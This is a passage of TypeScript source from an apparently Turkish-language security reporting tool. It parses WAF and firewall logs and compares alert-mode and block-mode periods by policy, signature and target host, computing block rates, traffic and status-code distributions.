      for (const rawLine of lines) {
        const subLines = unpackConcatenatedLines(rawLine);
        for (const singleLine of subLines) {
          const trimmed = singleLine.trim();
          if (!trimmed || trimmed.startsWith('#')) continue;
          if (!formatState.detected) feedSampleLine(formatState, trimmed);
          if (isDelimitedHeaderLine(trimmed, formatState)) continue;

          let parsed = parseLineToNormalizedLog(trimmed, formatState);
          // If formatState is not detected (e.g. arbitrary random CSV), do not blindly treat raw text as valid requests unless valid security fields match
          if (!formatState.detected && parsed && !parsed.ip_adresi && !parsed.hedef_ip && !parsed.status_code && !parsed.http_method && parsed.baglanti_karari === 'BILINMIYOR') {
            parsed = null;
          }

          if (!parsed && (trimmed.includes('=') || trimmed.includes(','))) {
            const srcMatch = trimmed.match(/\b(?:src|srcip|src_ip|client|ip)=["']?([^"\s',;]+)/i);
            const dstMatch = trimmed.match(/\b(?:dst|dstip|dst_ip|host|server)=["']?([^"\s',;]+)/i);
            const actionMatch = trimmed.match(/\b(?:action)=["']?([^"\s',;]+)/i);
            const statusMatch = trimmed.match(/\b(?:status|status_code)=["']?(\d+)/i);
            const urlMatch = trimmed.match(/\b(?:http_url|url|uri|path)=["']?([^"\s';]+)/i);

            if (srcMatch || dstMatch || actionMatch || statusMatch || urlMatch) {
              const isDeny = actionMatch ? /deny|block|drop|reject|close/i.test(actionMatch[1]) : false;
              parsed = {
                kaynak_dosya: file.name,
                tarih: null,
                tarih_obj: null,
                ip_adresi: srcMatch ? srcMatch[1] : null,
                hedef_ip: dstMatch ? dstMatch[1] : null,
                hedef_port: null,
                kaynak_port: null,
                sunucu_ismi: dstMatch ? dstMatch[1] : null,
                islem_komutu: urlMatch ? urlMatch[1] : trimmed,
                http_method: null,
                user_agent: null,
                byte_degeri: null,
                istemci_byte: null,
                status_code: statusMatch ? parseInt(statusMatch[1], 10) : null,
                baglanti_karari: isDeny ? 'DENY' : actionMatch ? 'ACCEPT' : 'BILINMIYOR',
                kullanici_adi: null,
                referer: null,
                response_time_ms: null,
                session_cookie: null,
                weight: 1,
              };
            }
          }

          if (parsed) {
            allLogs.push(parsed);
            rawLines.push(trimmed);
            parsedCountForFile++;

            if (!sampleVal) {
              sampleVal = {
                samplePolicy: extractPolicyFromLog(parsed, trimmed),
                sampleThreat: parsed.islem_komutu || '-',
                sampleResponse: parsed.baglanti_karari,
                sampleDestination: parsed.sunucu_ismi || '-',
                sampleCount: parsed.weight || 1,
              };
            }
          }
        }
      }

      const isXlsx = file.name.toLowerCase().endsWith('.xlsx') || file.name.toLowerCase().endsWith('.xls');
      const fileHasExplicitAction =
        !isXlsx &&
        lines.some((l) =>
          /\b(?:action|act|device_action|waf_action|policy_action|decision)=["']?(alert|alarm|block|deny|drop|reject|allow|pass|engellendi|izin)\b/i.test(
            l
          )
        );
      const expectedColNames = [
        'Policy Name (custom)',
        'Threat Type (custom)',
        'Event Name',
        'Log Source',
        'Response',
        'Destination',
        'Destination Port',
        'Start Time',
        'Low Level',
        'Count',
      ];
      const fallbackColStatusList = expectedColNames.map((name) => ({
        name,
        canonicalKey: name.toLowerCase().replace(/[^a-z0-9]/g, '_'),
        present: false,
      }));

      diagnostics.push({
        fileName: file.name,
        fileType: isXlsx ? 'XLSX' : 'CSV/LOG',
        sheetName: (file as any).sheetName || 'Sheet1',
        headerFound: Boolean(formatState.delimiterHeaders && formatState.delimiterHeaders.length > 0),
        totalLines: lines.filter((l) => l.trim().length > 0).length,
        parsedRowsCount: parsedCountForFile,
        rejectedRowsCount: lines.filter((l) => l.trim().length > 0).length - parsedCountForFile,
        rejectionReasons:
          parsedCountForFile === 0
            ? ['Excel veya log dosyasında F5 şeması ya da tanınan güvenlik başlıkları tespit edilemedi']
            : [],
        normalizedRecordsCount: parsedCountForFile,
        aggregateObservationCount: parsedCountForFile,
        detectedFormat: isXlsx ? 'UNKNOWN' : formatState.formatDisplayName || 'Düz Metin Log (Syslog / W3C)',
        detectedColumns: formatState.delimiterHeaders || [],
        isF5SchemaDetected: false,
        actionDataAvailable: fileHasExplicitAction || Boolean(forceAction),
        columnStatusList: fallbackColStatusList,
        columnMapping: {},
        unmatchedExpectedColumns: EXPECTED_F5_COLUMNS,
        sampleParsedValues: sampleVal,
        warningOrError:
          parsedCountForFile === 0
            ? isXlsx
              ? 'Excel okundu ancak karşılaştırılabilir kayıt oluşturulamadı. Neden: Dosyada beklenen F5 sütun başlıkları (Policy Name, Event Name, Count vb.) bulunamadı.'
              : 'Dosyadaki log satırları hiçbir güvenlik şablonuyla eşleşmedi. 0 satır parse edildi.'
            : null,
      });
    }
  }

  let totalRequests = 0;
  let hasAnyCountData = false;
  let blockedRequests = 0;
  let alertedRequests = 0;
  let allowedRequests = 0;
  let otherActionRequests = 0;
  let totalBytes = 0;
  let blockedBytes = 0;
  let hasByteData = false;
  let serverErrors5xx = 0;
  let authFailures = 0;
  const attackIps = new Set<string>();

  let minDate: Date | null = null;
  let maxDate: Date | null = null;
  let minDateRaw: string | null = null;
  let maxDateRaw: string | null = null;

  for (let i = 0; i < allLogs.length; i++) {
    const l = allLogs[i];
    const raw = rawLines[i] || '';
    const normAct = normalizeActionFromLog(l, raw);
    if (l.count !== null && l.count !== undefined) {
      hasAnyCountData = true;
    }
    const weight = l.weight !== undefined && l.weight !== null ? l.weight : 1;

    totalRequests += weight;

    if (normAct === 'BLOCK') {
      blockedRequests += weight;
    } else if (normAct === 'ALERT') {
      alertedRequests += weight;
    } else if (normAct === 'ALLOW') {
      allowedRequests += weight;
    } else {
      otherActionRequests += weight;
    }

    const realByte = extractRealBytes(l, raw);
    if (realByte !== null && realByte > 0) {
      hasByteData = true;
      totalBytes += realByte * weight;
      if (normAct === 'BLOCK') {
        blockedBytes += realByte * weight;
      }
    }

    if (l.status_code && l.status_code >= 500) {
      serverErrors5xx += weight;
    }
    if (l.status_code && [401, 403, 530].includes(l.status_code)) {
      authFailures += weight;
    }

    if (normAct === 'BLOCK' || normAct === 'ALERT') {
      if (l.ip_adresi) attackIps.add(l.ip_adresi);
    }

    if (l.tarih_obj && !isNaN(l.tarih_obj.getTime())) {
      if (!minDate || l.tarih_obj < minDate) {
        minDate = l.tarih_obj;
        minDateRaw = l.tarih || null;
      }
      if (!maxDate || l.tarih_obj > maxDate) {
        maxDate = l.tarih_obj;
        maxDateRaw = l.tarih || null;
      }
    } else if (l.tarih) {
      const d = new Date(l.tarih.replace(/\//g, '-'));
      if (!isNaN(d.getTime())) {
        if (!minDate || d < minDate) {
          minDate = d;
          minDateRaw = l.tarih;
        }
        if (!maxDate || d > maxDate) {
          maxDate = d;
          maxDateRaw = l.tarih;
        }
      }
    } else {
      const dateMatch = raw.match(
        /\b(?:date|timestamp|time)=["']?(\d{4}[-/]\d{2}[-/]\d{2}(?:[T\s]\d{2}:\d{2}:\d{2})?)/i
      );
      if (dateMatch) {
        const d = new Date(dateMatch[1].replace(/\//g, '-'));
        if (!isNaN(d.getTime())) {
          if (!minDate || d < minDate) {
            minDate = d;
            minDateRaw = dateMatch[1];
          }
          if (!maxDate || d > maxDate) {
            maxDate = d;
            maxDateRaw = dateMatch[1];
          }
        }
      }
    }
  }

  const blockRate =
    totalRequests > 0 ? parseFloat(((blockedRequests / totalRequests) * 100).toFixed(1)) : 0;

  let totalDays = 1;
  if (minDate && maxDate) {
    const diffMs = Math.abs(maxDate.getTime() - minDate.getTime());
    const days = Math.round(diffMs / (1000 * 60 * 60 * 24)) + 1;
    totalDays = Math.max(1, days);
  }

  const dailyAverageRequests = Math.round(totalRequests / totalDays);
  const dailyAverageBlocks = Math.round(blockedRequests / totalDays);
  const dailyAverageCount = parseFloat((totalRequests / totalDays).toFixed(1));

  const isBackendLogIncluded = files.some(
    (f) =>
      /backend|access|nginx|apache|iis|catalina|application|app_log/i.test(f.name) ||
      /request_time|upstream_response_time|X-Forwarded-For/i.test(f.content.slice(0, 1000))
  );

  const responseDistribution: Record<string, number> = {};
  for (const l of allLogs) {
    if (l.response_code) {
      responseDistribution[l.response_code] = (responseDistribution[l.response_code] || 0) + (l.weight || 1);
    }
  }

  const hasActionAvailable = diagnostics.some((d) => d.actionDataAvailable === true);

  const dq: PeriodDataQuality = {
    totalRows: linesCountTotal(files),
    parsedRows: allLogs.length,
    rejectedRows: diagnostics.reduce((acc, d) => acc + (d.rejectedRowsCount || 0), 0),
    aggregateCount: totalRequests,
    missingPolicy: allLogs.filter((l) => !l.policy_name || l.policy_name === 'F5-WAF-Policy' || l.policy_name === 'Genel-WAF-Policy').length,
    missingEvent: allLogs.filter((l) => !l.event_name || l.event_name === 'F5-WAF-Attack').length,
    missingAction: hasActionAvailable ? 0 : allLogs.length,
    missingResponse: allLogs.filter((l) => !l.response_code).length,
    invalidCount: 0,
    warnings: diagnostics.filter((d) => d.warningOrError).map((d) => `${d.fileName}: ${d.warningOrError}`),
  };

  return {
    logs: allLogs,
    rawLines,
    diagnostics,
    actionDataAvailable: hasActionAvailable,
    responseDistribution,
    dataQuality: dq,
    metrics: {
      label,
      totalRequests,
      blockedRequests,
      alertedRequests,
      allowedRequests,
      otherActionRequests,
      blockRate,
      totalBytes,
      blockedBytes,
      hasByteData,
      startDate: minDate ? minDate.toISOString().slice(0, 10) : null,
      endDate: maxDate ? maxDate.toISOString().slice(0, 10) : null,
      totalDays,
      dailyAverageRequests,
      dailyAverageBlocks,
      // Normalized Period Metrics
      periodStart: minDateRaw || (minDate ? minDate.toISOString().slice(0, 19).replace('T', ' ') : null),
      periodEnd: maxDateRaw || (maxDate ? maxDate.toISOString().slice(0, 19).replace('T', ' ') : null),
      periodDays: totalDays,
      hasCountData: hasAnyCountData,
      totalCount: hasAnyCountData ? totalRequests : (allLogs.length === 0 ? 0 : null),
      dailyAverageCount: hasAnyCountData ? dailyAverageCount : (allLogs.length === 0 ? 0 : null),
      isBackendLogIncluded,
      uniqueAttackIps: attackIps.size,
      serverErrors5xx,
      authFailures,
      criticalThreatIps: Math.round(attackIps.size * 0.4),
      highThreatIps: Math.round(attackIps.size * 0.6),
    },
  };
}

function linesCountTotal(files: FileInput[]): number {
  return files.reduce((acc, f) => acc + f.content.split(/\r?\n/).filter((l) => l.trim().length > 0).length, 0);
}

interface InternalAggregatedEntry {
  policyId: string;
  signatureId: string;
  eventName: string;
  threatType: string;
  logSource: string;
  name: string;
  category: PolicySignatureImpact['category'];
  cveOrRef?: string;
  aTotal: number;
  aAlert: number;
  aBlock: number;
  aAllow: number;
  aOther: number;
  aBytes: number | null;
  bTotal: number;
  bAlert: number;
  bBlock: number;
  bAllow: number;
  bOther: number;
  bBytes: number | null;
  beforeResponses: Map<string, number>;
  afterResponses: Map<string, number>;
  targetsA: Map<string, { alert: number; block: number }>;
  targetsB: Map<string, { alert: number; block: number }>;
}

export interface PolicyComparisonOptions {
  policyAssumptionMode?: boolean;
}

export function compareSecurityPeriods(
  periodAFiles: FileInput[],
  periodBFiles: FileInput[],
  labelA: string = 'Önceki Dönem (Referans / Alert)',
  labelB: string = 'Güncel Dönem (Sıkılaştırılmış / Block)',
  options?: PolicyComparisonOptions
): PolicyComparisonResult {
  const forceA = options?.policyAssumptionMode ? 'ALERT' : undefined;
  const forceB = options?.policyAssumptionMode ? 'BLOCK' : undefined;
  const periodA = parsePeriodContent(periodAFiles, labelA, forceA);
  const periodB = parsePeriodContent(periodBFiles, labelB, forceB);

  const isDemo = periodAFiles.some(
    (f) =>
      f.name.includes('agustos_2026_alert_donemi') ||
      f.name.includes('donem_a_raw') ||
      f.content.includes('FW-CORP-WAF')
  );

  const actionDataAvailable = periodA.actionDataAvailable && periodB.actionDataAvailable;

  // Primary Comparison Key: `${policyId}:::${eventName || signatureId}`
  const aggMap = new Map<string, InternalAggregatedEntry>();

  function getOrCreateEntry(
    policyId: string | null,
    threat: ThreatIdentity,
    log: NormalizedLog
  ): InternalAggregatedEntry {
    const rawEventName = log.event_name || threat.name || threat.signatureId || null;
    const rawThreatType = log.threat_type || threat.category || null;
    const rawLogSource = log.log_source || '-';
    
    // Grouping tokens strictly isolated to dictionary key:
    const groupPolicy = policyId && policyId.trim() ? policyId.trim() : '__NO_POLICY__';
    const groupEvent = (rawEventName || '__NO_EVENT__').toLowerCase().trim();
    const key = `${groupPolicy}:::${groupEvent}`;

    let entry = aggMap.get(key);
    if (!entry) {
      entry = {
        policyId: policyId || '',
        signatureId: threat.signatureId || rawEventName || 'N/A',
        eventName: rawEventName || '',
        threatType: rawThreatType || '',
        logSource: rawLogSource,
        name: rawEventName || threat.name || 'N/A',
        category: threat.category,
        cveOrRef: threat.cveOrRef,
        aTotal: 0,
        aAlert: 0,
        aBlock: 0,
        aAllow: 0,
        aOther: 0,
        aBytes: null,
        bTotal: 0,
        bAlert: 0,
        bBlock: 0,
        bAllow: 0,
        bOther: 0,
        bBytes: null,
        beforeResponses: new Map(),
        afterResponses: new Map(),
        targetsA: new Map(),
        targetsB: new Map(),
      };
      aggMap.set(key, entry);
    } else {
      if (entry.logSource === '-' && rawLogSource !== '-') {
        entry.logSource = rawLogSource;
      }
      if ((!entry.threatType || entry.threatType === 'Diğer') && rawThreatType) {
        entry.threatType = rawThreatType;
      }
    }
    return entry;
  }

  // Populate Period A
  for (let i = 0; i < periodA.logs.length; i++) {
    const log = periodA.logs[i];
    const raw = periodA.rawLines[i] || '';
    const policyId = extractPolicyFromLog(log, raw);
    const threats = identifyThreatsInLog(log, raw);
    const threatList = threats.length > 0 ? threats : [{
      signatureId: log.event_name || '__NO_EVENT__',
      name: log.event_name || 'N/A',
      category: 'Diğer' as const,
    }];
    const act = normalizeActionFromLog(log, raw);
    const host = extractServerFromLog(log, raw);
    const byteVal = extractRealBytes(log, raw);
    const count = log.weight !== undefined && log.weight !== null ? log.weight : 1;

    for (const t of threatList) {
      const entry = getOrCreateEntry(policyId, t, log);
      entry.aTotal += count;
      if (act === 'BLOCK') entry.aBlock += count;
      else if (act === 'ALERT') entry.aAlert += count;
      else if (act === 'ALLOW') entry.aAllow += count;
      else entry.aOther += count;

      if (log.response_code) {
        entry.beforeResponses.set(
          log.response_code,
          (entry.beforeResponses.get(log.response_code) || 0) + count
        );
      }

      if (byteVal !== null) {
        entry.aBytes = (entry.aBytes || 0) + byteVal * count;
      }

      if (host && host !== 'Hedef-Sunucu' && host !== 'Web-Sunucu') {
        let hostTarget = entry.targetsA.get(host);
        if (!hostTarget) {
          hostTarget = { alert: 0, block: 0 };
          entry.targetsA.set(host, hostTarget);
        }
        if (act === 'BLOCK') hostTarget.block += count;
        else if (act === 'ALERT') hostTarget.alert += count;
      }
    }
  }

  // Populate Period B
  for (let i = 0; i < periodB.logs.length; i++) {
    const log = periodB.logs[i];
    const raw = periodB.rawLines[i] || '';
    const policyId = extractPolicyFromLog(log, raw);
    const threats = identifyThreatsInLog(log, raw);
    const threatList = threats.length > 0 ? threats : [{
      signatureId: log.event_name || '__NO_EVENT__',
      name: log.event_name || 'N/A',
      category: 'Diğer' as const,
    }];
    const act = normalizeActionFromLog(log, raw);
    const host = extractServerFromLog(log, raw);
    const byteVal = extractRealBytes(log, raw);
    const count = log.weight !== undefined && log.weight !== null ? log.weight : 1;

    for (const t of threatList) {
      const entry = getOrCreateEntry(policyId, t, log);
      entry.bTotal += count;
      if (act === 'BLOCK') entry.bBlock += count;
      else if (act === 'ALERT') entry.bAlert += count;
      else if (act === 'ALLOW') entry.bAllow += count;
      else entry.bOther += count;

      if (log.response_code) {
        entry.afterResponses.set(
          log.response_code,
          (entry.afterResponses.get(log.response_code) || 0) + count
        );
      }

      if (byteVal !== null) {
        entry.bBytes = (entry.bBytes || 0) + byteVal * count;
      }

      if (host && host !== 'Hedef-Sunucu' && host !== 'Web-Sunucu') {
        let hostTarget = entry.targetsB.get(host);
        if (!hostTarget) {
          hostTarget = { alert: 0, block: 0 };
          entry.targetsB.set(host, hostTarget);
        }
        if (act === 'BLOCK') hostTarget.block += count;
        else if (act === 'ALERT') hostTarget.alert += count;
      }
    }
  }

  // Build signature impacts and technical statuses
  const signatureImpacts: PolicySignatureImpact[] = [];

  for (const entry of aggMap.values()) {
    const aTotal = entry.aTotal;
    const bTotal = entry.bTotal;

    const inA = aTotal > 0;
    const inB = bTotal > 0;

    if (!inA && !inB) continue;

    const delta = bTotal - aTotal;
    const changePct = aTotal > 0 ? parseFloat((((bTotal - aTotal) / aTotal) * 100).toFixed(2)) : null;

    const beforeRespObj: Record<string, number> = {};
    entry.beforeResponses.forEach((v, k) => {
      beforeRespObj[k] = v;
    });
    const afterRespObj: Record<string, number> = {};
    entry.afterResponses.forEach((v, k) => {
      afterRespObj[k] = v;
    });

    let technicalStatus: PolicyTechnicalStatus;
    let statusLabel: string;
    let actionChangeLabel: string;
    let isContinuingInAfter: 'Evet' | 'Hayır' | 'Yeni';
    let actionTransition: PolicySignatureImpact['actionTransition'];
    let forensicInterpretation: string;
    let aBlockRate = 0;
    let bBlockRate = 0;
    let blockRateDelta = 0;
    let protectionStatus: PolicySignatureImpact['protectionStatus'] = 'INCELEME_GEREKLI';

    if (actionDataAvailable) {
      const aDenom = entry.aAlert + entry.aBlock;
      const bDenom = entry.bAlert + entry.bBlock;
      aBlockRate = aDenom > 0 ? parseFloat(((entry.aBlock / aDenom) * 100).toFixed(1)) : 0;
      bBlockRate = bDenom > 0 ? parseFloat(((entry.bBlock / bDenom) * 100).toFixed(1)) : 0;
      blockRateDelta = parseFloat((bBlockRate - aBlockRate).toFixed(1));

      if (inA && inB) {
        isContinuingInAfter = 'Evet';
        if (entry.bAlert > 0 && entry.bBlock > 0) {
          technicalStatus = 'KISMI_DEGISIM';
          statusLabel = 'Kısmi değişim';
          actionChangeLabel = 'Kısmi değişim';
          actionTransition = 'STRENGTHENED';
          forensicInterpretation = `${entry.name} imzası sonraki dönemde de gözlenmektedir. ${entry.bAlert.toLocaleString('tr-TR')} olay ALERT aksiyonu ile devam ederken ${entry.bBlock.toLocaleString('tr-TR')} olayda BLOCK aksiyonu gözlenmiştir.`;
        } else if (entry.aAlert > entry.aBlock && entry.bBlock > 0 && entry.bAlert === 0) {
          technicalStatus = 'BLOCK_GOZLENDI';
          statusLabel = 'BLOCK gözleniyor';
          actionChangeLabel = 'ALERT → BLOCK';
          actionTransition = 'ALERT_TO_BLOCK';
          forensicInterpretation = `İlgili policy/rule/signature için sonraki dönemde BLOCK aksiyonunun gözlendiği ve aksiyon dağılımının ALERT ağırlıklı yapıdan BLOCK ağırlıklı yapıya değiştiği görülmektedir. (ALERT → BLOCK değişimi log gözlemine dayalıdır).`;
        } else if (entry.bBlock === 0 && entry.bAlert > 0) {
          technicalStatus = 'BLOCK_GOZLENMEDI';
          statusLabel = 'BLOCK gözlenmedi';
          actionChangeLabel = 'Değişiklik gözlenmedi';
          actionTransition = 'NO_CHANGE';
          forensicInterpretation = `İlgili imza için sonraki dönemde BLOCK aksiyonu gözlenmemiştir. ${entry.bAlert.toLocaleString('tr-TR')} olay ALERT olarak devam etmektedir.`;
        } else if (entry.aBlock > 0 && entry.bBlock > 0 && entry.aAlert === 0 && entry.bAlert === 0) {
          technicalStatus = 'BLOCK_GOZLENDI';
          statusLabel = 'BLOCK gözleniyor';
          actionChangeLabel = 'Değişiklik gözlenmedi';
          actionTransition = 'MAINTAINED_BLOCK';
          forensicInterpretation = `İlgili kural her iki dönemde de BLOCK modunda gözlenmeye devam etmektedir (${entry.bBlock.toLocaleString('tr-TR')} BLOCK).`;
        } else {
          technicalStatus = 'ALERT_DEVAM_EDIYOR';
          statusLabel = 'ALERT devam ediyor';
          actionChangeLabel = 'Değişiklik gözlenmedi';
          actionTransition = 'NO_CHANGE';
          forensicInterpretation = `İlgili imza sonraki dönemde de gözlenmektedir.`;
        }
      } else if (inA && !inB) {
        isContinuingInAfter = 'Hayır';
        technicalStatus = 'LOGLARDA_GOZLENMEDI';
        statusLabel = 'Loglarda gözlenmedi';
        actionChangeLabel = 'Sonraki dönemde gözlenmedi';
        actionTransition = 'NOT_OBSERVED_AFTER';
        forensicInterpretation = `İlgili imza sonraki karşılaştırma döneminde WAF/firewall loglarında gözlenmemiştir.`;
      } else {
        isContinuingInAfter = 'Yeni';
        technicalStatus = 'YENI_GORULEN_EVENT';
        statusLabel = 'Yeni görülen kayıt';
        actionChangeLabel = 'Yeni imza';
        actionTransition = 'NEW_DETECTION';
        forensicInterpretation = `İlgili imza ilk kez sonraki dönemde gözlenmiştir (${bTotal.toLocaleString('tr-TR')} istek).`;
      }

      if (bBlockRate >= 98 || (entry.bBlock > 0 && entry.bAlert === 0)) {
        protectionStatus = 'TUMU_BLOKLANDI';
      } else if (bBlockRate >= 80) {
        protectionStatus = 'YUKSEK_ETKINLIK';
      }
    } else {
      // actionDataAvailable = false (Pure observation and HTTP status analysis)
      actionChangeLabel = 'N/A (Action Kolonu Yok)';
      if (inA && inB) {
        isContinuingInAfter = 'Evet';
        technicalStatus = 'DEVAM_EDEN_GOZLEM';
        statusLabel = 'Gözlem devam ediyor';
        actionTransition = 'NO_CHANGE';
        forensicInterpretation = `${entry.name} kaydı sonraki dönemde de gözlenmektedir. Dönem A'da ${aTotal.toLocaleString('tr-TR')} gözlem, Dönem B'de ${bTotal.toLocaleString('tr-TR')} gözlem (${delta >= 0 ? '+' : ''}${delta.toLocaleString('tr-TR')} fark) kaydedilmiştir.`;
      } else if (inA && !inB) {
        isContinuingInAfter = 'Hayır';
        technicalStatus = 'LOGLARDA_GOZLENMEDI';
        statusLabel = 'Loglarda gözlenmedi';
        actionChangeLabel = 'Sonraki dönemde gözlenmedi';
        actionTransition = 'NOT_OBSERVED_AFTER';
        forensicInterpretation = `İlgili kayıt sonraki karşılaştırma döneminde WAF/firewall loglarında gözlenmemiştir. (Önceki dönemde ${aTotal.toLocaleString('tr-TR')} gözlem kaydedilmişti).`;
      } else {
        isContinuingInAfter = 'Yeni';
        technicalStatus = 'YENI_GORULEN_EVENT';
        statusLabel = 'Yeni görülen kayıt';
        actionChangeLabel = 'Yeni kayıt';
        actionTransition = 'NEW_DETECTION';
        forensicInterpretation = `İlgili kayıt ilk kez sonraki dönemde kaynak loglarda gözlenmiştir (${bTotal.toLocaleString('tr-TR')} gözlem).`;
      }
    }

    // Combine targets
    const allHosts = new Set([...entry.targetsA.keys(), ...entry.targetsB.keys()]);
    const targetHosts = Array.from(allHosts)
      .map((host) => {
        const tA = entry.targetsA.get(host) || { alert: 0, block: 0 };
        const tB = entry.targetsB.get(host) || { alert: 0, block: 0 };
        return {
          host,
          beforeAlert: tA.alert,
          beforeBlock: tA.block,
          afterAlert: tB.alert,
          afterBlock: tB.block,
        };
      })
      .sort((x, y) => y.afterBlock + y.beforeAlert - (x.afterBlock + x.beforeAlert));

    const trafficBeforeMb =
      entry.aBytes !== null ? parseFloat((entry.aBytes / (1024 * 1024)).toFixed(2)) : null;
    const trafficAfterMb =
      entry.bBytes !== null ? parseFloat((entry.bBytes / (1024 * 1024)).toFixed(2)) : null;

    signatureImpacts.push({
      policyId: entry.policyId,
      policyName: entry.policyId || undefined,
      signatureId: entry.signatureId,
      name: entry.name,
      category: entry.category,
      cveOrRef: entry.cveOrRef,
      eventName: entry.eventName,
      threatType: entry.threatType,
      logSource: entry.logSource,
      beforeCount: aTotal,
      afterCount: bTotal,
      delta,
      changePct,
      actionDataAvailable,
      periodA_total: aTotal,
      periodA_alerted: entry.aAlert,
      periodA_blocked: entry.aBlock,
      periodA_blockRate: aBlockRate,
      periodB_total: bTotal,
      periodB_alerted: entry.bAlert,
      periodB_blocked: entry.bBlock,
      periodB_blockRate: bBlockRate,
      beforeResponses: beforeRespObj,
      afterResponses: afterRespObj,
      actionTransition,
      actionChangeLabel,
      isContinuingInAfter,
      technicalStatus,
      statusLabel,
      forensicInterpretation,
      blockRateDelta,
      preventedAttemptsCount: entry.bBlock,
      savedBandwidthBytes: entry.bBytes || 0,
      protectionStatus,
      targetHosts,
      trafficBeforeMb,
      trafficAfterMb,
    });
  }

  // Sort: primary by afterCount or prevented attempts descending
  signatureImpacts.sort((a, b) => (b.afterCount ?? b.periodB_total) - (a.afterCount ?? a.periodA_total));

  // Groupings for Customer Report
  const continuingSignatures = {
    alertContinuing: actionDataAvailable
      ? signatureImpacts.filter(
          (s) => s.isContinuingInAfter === 'Evet' && s.periodB_alerted > 0 && s.periodB_blocked === 0
        )
      : signatureImpacts.filter((s) => s.isContinuingInAfter === 'Evet' && (s.delta ?? 0) >= 0),
    blockObserved: actionDataAvailable
      ? signatureImpacts.filter(
          (s) => s.isContinuingInAfter === 'Evet' && s.periodB_blocked > 0 && s.periodB_alerted === 0
        )
      : [],
    partialChange: actionDataAvailable
      ? signatureImpacts.filter(
          (s) => s.isContinuingInAfter === 'Evet' && s.periodB_blocked > 0 && s.periodB_alerted > 0
        )
      : signatureImpacts.filter((s) => s.isContinuingInAfter === 'Evet' && (s.delta ?? 0) < 0),
  };

  const notObservedSignatures = signatureImpacts.filter(
    (s) => s.technicalStatus === 'LOGLARDA_GOZLENMEDI'
  );
  const newObservedSignatures = signatureImpacts.filter(
    (s) => s.isContinuingInAfter === 'Yeni' || s.technicalStatus === 'YENI_GORULEN_EVENT'
  );

  // Policy breakdown
  const policyAggMap = new Map<
    string,
    {
      policy: string;
      beforeCount: number;
      afterCount: number;
      delta: number;
      changePct: number | null;
      beforeBlockRate?: number | null;
      afterBlockRate?: number | null;
      eventsCount: number;
      continuingEventsCount: number;
      disappearedEventsCount: number;
      newEventsCount: number;
    }
  >();

  for (const s of signatureImpacts) {
    let p = policyAggMap.get(s.policyId);
    if (!p) {
      p = {
        policy: s.policyId,
        beforeCount: 0,
        afterCount: 0,
        delta: 0,
        changePct: null,
        eventsCount: 0,
        continuingEventsCount: 0,
        disappearedEventsCount: 0,
        newEventsCount: 0,
      };
      policyAggMap.set(s.policyId, p);
    }
    p.eventsCount++;
    p.beforeCount += (s.beforeCount ?? s.periodA_total);
    p.afterCount += (s.afterCount ?? s.periodB_total);
    p.delta = p.afterCount - p.beforeCount;
    p.changePct =
      p.beforeCount > 0 ? parseFloat((((p.afterCount - p.beforeCount) / p.beforeCount) * 100).toFixed(2)) : null;

    if (s.technicalStatus === 'LOGLARDA_GOZLENMEDI') p.disappearedEventsCount++;
    else if (s.technicalStatus === 'YENI_GORULEN_EVENT') p.newEventsCount++;
    else p.continuingEventsCount++;
  }

  const policyComparison = Array.from(policyAggMap.values()).sort(
    (a, b) => b.beforeCount + b.afterCount - (a.beforeCount + a.afterCount)
  );

  // Multi-Dimensional Protected Servers Map (HOST + SIGNATURE)
  const serverThreatMap = new Map<
    string,
    Map<string, { ruleOrAttack: string; signatureId: string; category: string; aAllowed: number; bBlocked: number }>
  >();

  function getOrCreateServerMap(srv: string) {
    let sMap = serverThreatMap.get(srv);
    if (!sMap) {
      sMap = new Map();
      serverThreatMap.set(srv, sMap);
    }
    return sMap;
  }

  for (let i = 0; i < periodA.logs.length; i++) {
    const log = periodA.logs[i];
    const raw = periodA.rawLines[i] || '';
    const threats = identifyThreatsInLog(log, raw);
    if (threats.length === 0) continue;

    const srv = extractServerFromLog(log, raw);
    const sMap = getOrCreateServerMap(srv);
    const act = normalizeActionFromLog(log, raw);
    const count = log.weight && log.weight > 0 ? log.weight : 1;

    for (const t of threats) {
      let tEntry = sMap.get(t.signatureId);
      if (!tEntry) {
        tEntry = {
          ruleOrAttack: t.name,
          signatureId: t.signatureId,
          category: t.category,
          aAllowed: 0,
          bBlocked: 0,
        };
        sMap.set(t.signatureId, tEntry);
      }
      if (act !== 'BLOCK') {
        tEntry.aAllowed += count;
      }
    }
  }

  for (let i = 0; i < periodB.logs.length; i++) {
    const log = periodB.logs[i];
    const raw = periodB.rawLines[i] || '';
    const threats = identifyThreatsInLog(log, raw);
    if (threats.length === 0) continue;

    const srv = extractServerFromLog(log, raw);
    const sMap = getOrCreateServerMap(srv);
    const act = normalizeActionFromLog(log, raw);
    const count = log.weight && log.weight > 0 ? log.weight : 1;

    for (const t of threats) {
      let tEntry = sMap.get(t.signatureId);
      if (!tEntry) {
        tEntry = {
          ruleOrAttack: t.name,
          signatureId: t.signatureId,
          category: t.category,
          aAllowed: 0,
          bBlocked: 0,
        };
        sMap.set(t.signatureId, tEntry);
      }
      if (act === 'BLOCK') {
        tEntry.bBlocked += count;
      }
    }
  }

  const protectedServers: ProtectedServerSummary[] = Array.from(serverThreatMap.entries())
    .map(([server, threatMap]) => {
      const threatsList: ProtectedServerThreatDetail[] = Array.from(threatMap.values())
        .map((t) => ({
          ruleOrAttack: t.ruleOrAttack,
          signatureId: t.signatureId,
          category: t.category,
          periodA_attacksAllowed: t.aAllowed,
          periodB_attacksBlocked: t.bBlocked,
        }))
        .sort(
          (x, y) =>
            y.periodB_attacksBlocked + y.periodA_attacksAllowed - (x.periodB_attacksBlocked + x.periodA_attacksAllowed)
        );

      const totalAllowedA = threatsList.reduce((acc, curr) => acc + curr.periodA_attacksAllowed, 0);
      const totalBlockedB = threatsList.reduce((acc, curr) => acc + curr.periodB_attacksBlocked, 0);

      return {
        server,
        periodA_attacksAllowed: totalAllowedA,
        periodB_attacksBlocked: totalBlockedB,
        protectionRate: null, // As per Test 18 methodology: never produce a unified protection rate across disparate rules
        threats: threatsList,
      };
    })
    .sort((a, b) => b.periodB_attacksBlocked - a.periodB_attacksBlocked)
    .slice(0, 10);

  // Overall calculations
  const blockRateDelta = actionDataAvailable
    ? parseFloat((periodB.metrics.blockRate - periodA.metrics.blockRate).toFixed(1))
    : 0;
  const blockRatePercentagePointsDelta = blockRateDelta;
  let blockRateRelativeChangePct: number | null = null;
  if (actionDataAvailable && periodA.metrics.blockRate > 0) {
    blockRateRelativeChangePct = parseFloat(
      (
        ((periodB.metrics.blockRate - periodA.metrics.blockRate) /
          periodA.metrics.blockRate) *
        100
      ).toFixed(1)
